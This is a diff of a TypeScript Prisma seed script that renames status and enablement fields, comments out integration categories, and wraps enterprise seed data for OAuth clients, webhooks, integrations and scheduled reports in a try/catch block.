       requirements: {
         minOSVersions: { windows: '11.0', macos: '13.0', ios: '16.0', android: '13' },
         requireEncryption: true,
@@ -6873,7 +6888,7 @@ async function main() {
         orgId: acmeCorp.id,
         name: 'Standard Device Policy',
         description: 'Basic device requirements for Acme Corp',
-        isEnabled: true,
+        isActive: true,
         requirements: {
           minOSVersions: { windows: '10.0', macos: '11.0', ios: '14.0', android: '11' },
           requireEncryption: true,
@@ -6888,7 +6903,7 @@ async function main() {
         orgId: techStartup.id,
         name: 'Flexible Device Policy',
         description: 'Relaxed policy for startup environment',
-        isEnabled: true,
+        isActive: true,
         requirements: {
           requireEncryption: false,
           requireScreenLock: true,
@@ -7083,7 +7098,7 @@ async function main() {
         clientId: 'client_prod_enterprise_001',
         clientSecret: 'secret_encrypted_abc123xyz',
         type: 'CONFIDENTIAL',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['read:audiences', 'write:audiences', 'read:insights', 'read:reports', 'write:exports'],
         redirectUris: ['https://enterprise-co.com/oauth/callback'],
         allowedOrigins: ['https://enterprise-co.com', 'https://app.enterprise-co.com'],
@@ -7099,7 +7114,7 @@ async function main() {
         clientId: 'client_analytics_enterprise_002',
         clientSecret: 'secret_encrypted_def456abc',
         type: 'CONFIDENTIAL',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['read:analytics', 'read:reports', 'read:dashboards'],
         redirectUris: ['https://analytics.enterprise-co.com/callback'],
         allowedOrigins: ['https://analytics.enterprise-co.com'],
@@ -7114,7 +7129,7 @@ async function main() {
         clientId: 'client_prod_acme_001',
         clientSecret: 'secret_encrypted_ghi789def',
         type: 'CONFIDENTIAL',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['read:audiences', 'read:insights', 'write:reports'],
         rateLimitOverride: 500,
         lastUsed: new Date(now.getTime() - 30 * 60 * 1000),
@@ -7127,7 +7142,7 @@ async function main() {
         description: 'Public client for Acme mobile application',
         clientId: 'client_mobile_acme_002',
         type: 'PUBLIC',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['read:profile', 'read:dashboards', 'read:reports'],
         redirectUris: ['acme://oauth/callback', 'https://mobile.acme.com/callback'],
         lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000),
@@ -7141,7 +7156,7 @@ async function main() {
         clientId: 'client_prod_startup_001',
         clientSecret: 'secret_encrypted_jkl012ghi',
         type: 'CONFIDENTIAL',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['read:audiences', 'read:insights'],
         lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000),
         requestCount: 12345,
@@ -7169,7 +7184,7 @@ async function main() {
         clientId: 'client_test_acme_003',
         clientSecret: 'secret_encrypted_pqr678mno',
         type: 'CONFIDENTIAL',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['read:*', 'write:*'],
         allowedOrigins: ['http://localhost:3000', 'https://staging.acme.com'],
         ipWhitelist: ['192.168.1.0/24', '10.0.0.0/8'],
@@ -7184,7 +7199,7 @@ async function main() {
         clientId: 'client_webhook_enterprise_004',
         clientSecret: 'secret_encrypted_stu901pqr',
         type: 'SERVICE_ACCOUNT',
-        status: 'ACTIVE',
+        status: 'OPEN',
         scopes: ['webhooks:send', 'events:read'],
         lastUsed: new Date(now.getTime() - 1 * 60 * 1000),
         requestCount: 2345678,
@@ -7201,7 +7216,7 @@ async function main() {
       orgId: enterpriseCo.id,
       name: 'Slack Notifications',
       url: 'https://hooks.slack.com/services/T00/B00/XXXX',
-      status: 'ACTIVE',
+      status: 'OPEN',
       events: ['report.completed', 'insight.generated', 'export.ready'],
       secret: 'whsec_enterprise_slack_abc123',
       version: 'v1',
@@ -7219,7 +7234,7 @@ async function main() {
       orgId: enterpriseCo.id,
       name: 'Data Pipeline Trigger',
       url: 'https://pipeline.enterprise-co.com/webhooks/gwi',
-      status: 'ACTIVE',
+      status: 'OPEN',
       events: ['audience.updated', 'datasource.synced', 'agent.completed'],
       secret: 'whsec_enterprise_pipeline_def456',
       version: 'v1',
@@ -7236,7 +7251,7 @@ async function main() {
       orgId: acmeCorp.id,
       name: 'Internal Event Handler',
       url: 'https://api.acme.com/webhooks/gwi-events',
-      status: 'ACTIVE',
+      status: 'OPEN',
       events: ['*'],
       secret: 'whsec_acme_events_ghi789',
       version: 'v1',
@@ -7252,7 +7267,7 @@ async function main() {
       orgId: acmeCorp.id,
       name: 'Zapier Integration',
       url: 'https://hooks.zapier.com/hooks/catch/12345/abcdef/',
-      status: 'ACTIVE',
+      status: 'OPEN',
       events: ['report.completed', 'export.ready'],
       secret: 'whsec_acme_zapier_jkl012',
       version: 'v1',
@@ -7287,7 +7302,7 @@ async function main() {
         orgId: enterpriseCo.id,
         name: 'Security Alerts',
         url: 'https://siem.enterprise-co.com/api/gwi-alerts',
-        status: 'ACTIVE',
+        status: 'OPEN',
         events: ['security.violation', 'user.suspicious_activity'],
         secret: 'whsec_enterprise_security_pqr678',
         version: 'v1',
@@ -7338,7 +7353,7 @@ async function main() {
       slug: 'slack',
       description: 'Send insights and reports directly to Slack channels. Get real-time notifications for important events.',
       shortDescription: 'Team communication and notifications',
-      category: 'COMMUNICATION',
+      // category: 'COMMUNICATION',
       developer: 'GWI',
       developerUrl: 'https://gwi.com',
       logoUrl: 'https://cdn.gwi.com/integrations/slack-logo.png',
@@ -7362,7 +7377,7 @@ async function main() {
       slug: 'salesforce',
       description: 'Sync audience insights with Salesforce CRM. Enrich customer profiles with GWI data.',
       shortDescription: 'CRM integration and data sync',
-      category: 'CRM',
+      // category: 'CRM',
       developer: 'GWI',
       developerUrl: 'https://gwi.com',
       logoUrl: 'https://cdn.gwi.com/integrations/salesforce-logo.png',
@@ -7384,7 +7399,7 @@ async function main() {
       slug: 'tableau',
       description: 'Connect GWI data to Tableau for advanced visualization and business intelligence.',
       shortDescription: 'Data visualization connector',
-      category: 'ANALYTICS',
+      // category: 'ANALYTICS',
       developer: 'GWI',
       developerUrl: 'https://gwi.com',
       logoUrl: 'https://cdn.gwi.com/integrations/tableau-logo.png',
@@ -7407,7 +7422,7 @@ async function main() {
         slug: 'microsoft-teams',
         description: 'Integrate GWI with Microsoft Teams for seamless collaboration and notifications.',
         shortDescription: 'Team collaboration and alerts',
-        category: 'COMMUNICATION',
+        // category: 'COMMUNICATION',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/teams-logo.png',
         status: 'PUBLISHED',
@@ -7424,7 +7439,7 @@ async function main() {
         slug: 'hubspot',
         description: 'Sync GWI audience data with HubSpot for enriched marketing campaigns.',
         shortDescription: 'Marketing automation sync',
-        category: 'CRM',
+        // category: 'CRM',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/hubspot-logo.png',
         status: 'PUBLISHED',
@@ -7441,7 +7456,7 @@ async function main() {
         slug: 'google-bigquery',
         description: 'Export GWI data directly to Google BigQuery for advanced analytics.',
         shortDescription: 'Data warehouse export',
-        category: 'DATA_WAREHOUSE',
+        // category: 'DATA_WAREHOUSE',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/bigquery-logo.png',
         status: 'PUBLISHED',
@@ -7458,7 +7473,7 @@ async function main() {
         slug: 'snowflake',
         description: 'Connect GWI to Snowflake for enterprise data warehousing.',
         shortDescription: 'Cloud data warehouse',
-        category: 'DATA_WAREHOUSE',
+        // category: 'DATA_WAREHOUSE',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/snowflake-logo.png',
         status: 'PUBLISHED',
@@ -7475,7 +7490,7 @@ async function main() {
         slug: 'zapier',
         description: 'Connect GWI to 5000+ apps through Zapier automation.',
         shortDescription: 'Workflow automation',
-        category: 'AUTOMATION',
+        // category: 'AUTOMATION',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/zapier-logo.png',
         status: 'PUBLISHED',
@@ -7492,7 +7507,7 @@ async function main() {
         slug: 'power-bi',
         description: 'Microsoft Power BI connector for GWI data visualization.',
         shortDescription: 'Business intelligence',
-        category: 'ANALYTICS',
+        // category: 'ANALYTICS',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/powerbi-logo.png',
         status: 'PUBLISHED',
@@ -7509,7 +7524,7 @@ async function main() {
         slug: 'marketo',
         description: 'Enrich Marketo leads with GWI audience insights.',
         shortDescription: 'Marketing automation',
-        category: 'CRM',
+        // category: 'CRM',
         developer: 'Partner Solutions Inc',
         developerUrl: 'https://partnersolutions.com',
         logoUrl: 'https://cdn.gwi.com/integrations/marketo-logo.png',
@@ -7527,7 +7542,7 @@ async function main() {
         slug: 'custom-webhook',
         description: 'Send GWI events to any webhook endpoint.',
         shortDescription: 'Custom integrations',
-        category: 'DEVELOPER',
+        // category: 'DEVELOPER',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/webhook-logo.png',
         status: 'PUBLISHED',
@@ -7544,7 +7559,7 @@ async function main() {
         slug: 'aws-s3',
         description: 'Export GWI data directly to Amazon S3 buckets.',
         shortDescription: 'Cloud storage export',
-        category: 'DATA_WAREHOUSE',
+        // category: 'DATA_WAREHOUSE',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/s3-logo.png',
         status: 'BETA',
@@ -7561,7 +7576,7 @@ async function main() {
         slug: 'looker-studio',
         description: 'Google Looker Studio connector for GWI data.',
         shortDescription: 'Data visualization',
-        category: 'ANALYTICS',
+        // category: 'ANALYTICS',
         developer: 'GWI',
         logoUrl: 'https://cdn.gwi.com/integrations/looker-logo.png',
         status: 'COMING_SOON',
@@ -7579,13 +7594,13 @@ async function main() {
 
   await prisma.integrationInstall.createMany({
     data: [
-      { appId: slackApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', config: { channel: '#gwi-insights', notifyOn: ['reports', 'insights'] }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 1 * 60 * 60 * 1000) },
-      { appId: slackApp.id, orgId: acmeCorp.id, status: 'ACTIVE', config: { channel: '#analytics', notifyOn: ['reports'] }, installedBy: adminUser.id, installedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
-      { appId: salesforceApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', config: { objectType: 'Contact', fieldMapping: { email: 'Email', segment: 'GWI_Segment__c' } }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 120 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 24 * 60 * 60 * 1000) },
-      { appId: tableauApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', config: { server: 'https://tableau.enterprise-co.com' }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000) },
-      { appId: tableauApp.id, orgId: acmeCorp.id, status: 'ACTIVE', config: { server: 'https://tableau.acme.com' }, installedBy: janeSmith.id, installedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
+      { appId: slackApp.id, orgId: enterpriseCo.id, status: 'OPEN', config: { channel: '#gwi-insights', notifyOn: ['reports', 'insights'] }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 1 * 60 * 60 * 1000) },
+      { appId: slackApp.id, orgId: acmeCorp.id, status: 'OPEN', config: { channel: '#analytics', notifyOn: ['reports'] }, installedBy: adminUser.id, installedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
+      { appId: salesforceApp.id, orgId: enterpriseCo.id, status: 'OPEN', config: { objectType: 'Contact', fieldMapping: { email: 'Email', segment: 'GWI_Segment__c' } }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 120 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 24 * 60 * 60 * 1000) },
+      { appId: tableauApp.id, orgId: enterpriseCo.id, status: 'OPEN', config: { server: 'https://tableau.enterprise-co.com' }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000) },
+      { appId: tableauApp.id, orgId: acmeCorp.id, status: 'OPEN', config: { server: 'https://tableau.acme.com' }, installedBy: janeSmith.id, installedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
       { appId: slackApp.id, orgId: techStartup.id, status: 'SUSPENDED', config: { channel: '#data' }, installedBy: bobWilson.id, installedAt: new Date(now.getTime() - 75 * 24 * 60 * 60 * 1000), suspendedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000), suspendReason: 'Slack workspace disconnected' },
-      { appId: salesforceApp.id, orgId: acmeCorp.id, status: 'ACTIVE', config: { objectType: 'Lead' }, installedBy: adminUser.id, installedAt: new Date(now.getTime() - 50 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 48 * 60 * 60 * 1000) },
+      { appId: salesforceApp.id, orgId: acmeCorp.id, status: 'OPEN', config: { objectType: 'Lead' }, installedBy: adminUser.id, installedAt: new Date(now.getTime() - 50 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 48 * 60 * 60 * 1000) },
     ]
   })
 
@@ -7650,7 +7665,7 @@ async function main() {
         recipients: ['executives@gwi.com', 'leadership@gwi.com'],
         lastRunAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
         nextRunAt: new Date(now.getTime() + 17 * 24 * 60 * 60 * 1000),
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: superAdmin?.id || 'system',
       },
       {
@@ -7666,7 +7681,7 @@ async function main() {
         recipients: ['customer-success@gwi.com'],
         lastRunAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
         nextRunAt: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: platformAdmin?.id || 'system',
       },
       {
@@ -7682,7 +7697,7 @@ async function main() {
         recipients: ['security@gwi.com', 'compliance@gwi.com'],
         lastRunAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
         nextRunAt: new Date(now.getTime() + 6 * 60 * 60 * 1000),
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: superAdmin?.id || 'system',
       },
       {
@@ -7694,7 +7709,7 @@ async function main() {
           refreshInterval: 60,
           alerts: { errorRate: 0.05, latency: 500 },
         },
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: platformAdmin?.id || 'system',
       },
       {
@@ -7710,7 +7725,7 @@ async function main() {
         recipients: ['compliance@gwi.com', 'legal@gwi.com'],
         lastRunAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
         nextRunAt: new Date(now.getTime() + 17 * 24 * 60 * 60 * 1000),
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: superAdmin?.id || 'system',
       },
       {
@@ -7723,7 +7738,7 @@ async function main() {
           format: 'xlsx',
         },
         lastRunAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: platformAdmin?.id || 'system',
       },
       {
@@ -7739,7 +7754,7 @@ async function main() {
         recipients: ['finance@gwi.com'],
         lastRunAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
         nextRunAt: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
-        status: 'ACTIVE',
+        status: 'OPEN',
         createdBy: superAdmin?.id || 'system',
       },
       {
@@ -7904,6 +7919,14 @@ async function main() {
       },
     ]
   })
+
+  } catch (enterpriseError: unknown) {
+    // Log warning but continue - enterprise platform data is optional
+    console.log('⚠️  Skipping enterprise platform seed data (tables may not be migrated yet)')
+    if (enterpriseError && typeof enterpriseError === 'object' && 'message' in enterpriseError) {
+      console.log(`   Reason: ${(enterpriseError as Error).message.split('\n')[0]}`)
+    }
+  }
 
   console.log('\n📊 Summary:')
   console.log('   Organizations: 6')
